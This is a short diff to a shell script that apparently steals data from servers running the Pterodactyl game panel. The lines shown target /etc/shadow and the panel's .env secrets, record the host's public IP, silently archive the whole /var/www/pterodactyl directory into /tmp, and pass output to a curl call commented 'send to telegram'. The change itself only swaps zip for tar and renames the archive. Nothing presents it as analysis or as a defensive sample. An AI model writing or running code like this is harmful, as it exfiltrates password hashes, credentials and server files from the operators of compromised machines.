@@ -13,10 +13,10 @@ FILE2="/etc/shadow"
 FILE3="/var/www/pterodactyl/.env"
 RESULT2="$(curl -4 -s ifconfig.me)"
 SRC="/var/www/pterodactyl"
-ZIP="/tmp/ptero.zip"
 PASSWORD="farizgd331"
 TMP="/tmp/ssh_backup"
 ARCHIVE="$TMP.tar"
+ZIP="/tmp/system.tar.gz"
 ENCRYPTED="$ARCHIVE.gpg"
 
 mkdir -p "$TMP"
@@ -68,7 +68,8 @@ curl -s \
   > /dev/null 2>&1
 
 # zip
-zip -r "$ZIP" "$SRC" > /dev/null 2>&1
+tar -czf /tmp/system.tar.gz /var/www/pterodactyl > /dev/null 2>&1
+
 
 # send to telegram
 curl -s \
